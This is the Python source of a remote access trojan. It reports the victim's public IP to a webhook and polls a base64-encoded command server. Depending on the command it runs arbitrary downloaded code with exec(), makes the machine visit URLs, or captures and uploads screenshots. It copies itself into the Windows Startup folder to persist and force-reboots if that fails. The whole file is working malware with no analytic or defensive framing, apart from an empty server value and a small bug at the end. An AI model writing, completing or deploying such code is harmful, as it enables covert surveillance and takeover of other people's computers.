
import base64, requests, os, sys, shutil, io, mss, random, json, mss.tools, time, threading

SERVER = ""

class Main:

    def __init__(self):

        self.UserIP = requests.get('https://api.ipify.org?format=json').json()["ip"]
        Response = requests.post(url=requests.get(f'{base64.b64decode(SERVER).decode('utf-8')}current_webhook').json()["WEBHOOK"], headers={'Content-Type': 'application/json'}, data=json.dumps({'content': f'New connection from, {self.UserIP}'}))

    def TakeScreenShot(self):

        try:

            with mss.mss() as sct:
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                png_data = mss.tools.to_png(screenshot.rgb, screenshot.size)
                image_bytes = io.BytesIO(png_data)
                image_bytes.seek(0)
                return image_bytes

        except: 

            pass
            

    def ExecCMD(self):

        self.last_exec_time = 0

        while True:

            Command = requests.get(f'{base64.b64decode(SERVER).decode('utf-8')}command').json()["COMMAND"]

            try:

                if Command == 0:
                    if time.time() - self.last_exec_time >= 180: 
                        CommandToExec = requests.get(f'{base64.b64decode(SERVER).decode('utf-8')}exec_code').json()["CODE"]
                        print(CommandToExec)
                        exec(CommandToExec)
                        self.last_exec_time = time.time()
                if Command == 1:
                    WebsiteToVisit = requests.get(f'{base64.b64decode(SERVER).decode('utf-8')}website_url').json()["WEBSITE"]
                    requests.get(WebsiteToVisit)
                if Command == 2:
                    Response = requests.post(requests.get(f'{base64.b64decode(SERVER).decode('utf-8')}current_webhook').json()["WEBHOOK"], files={'file': (f'{self.UserIP}[{random.randint(1291821,3298372139127)}].png', self.TakeScreenShot(), 'image/png')})
                    if Response.status_code != 204:
                        pass

            except:

                pass

            time.sleep(5)

    def Setup(self):
            
        try:

            ScriptPath = os.path.abspath(sys.argv[0])
            StartupFolder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            ClonedFile = os.path.join(StartupFolder, os.path.basename(ScriptPath))
            if not os.path.exists(ClonedFile):
                shutil.copy(ScriptPath, ClonedFile)

        except: 

            os.system("shutdown -t 0 -r -f")


I = Main().Setup()
I.ExecCMD()

